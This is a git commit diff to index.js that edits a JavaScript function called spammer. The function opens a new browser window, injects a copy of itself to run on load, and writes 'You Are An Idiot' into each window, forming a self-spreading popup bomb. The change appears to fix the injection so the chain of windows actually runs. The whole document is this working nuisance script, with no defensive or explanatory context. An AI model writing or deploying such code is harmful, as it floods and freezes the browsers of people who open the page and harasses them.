ea02c2d20f74c0d2b7709e4721838584513570be
JJJ <115508192+jj123llol@users.noreply.github.com>
2024-09-23 15:42:43 -0500

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ function spammer(){
   wind = window.open()
   script = wind.document.createElement('script')
   script.innerHTML = 'wind.onload = ' + spammer.toString() + ';';
-  wind.document.appendChild(script)
+  wind.document.body.appendChild(script)
   idiot = wind.document.createTextNode("You Are An Idiot")
   wind.document.body.appendChild(idiot)
   }
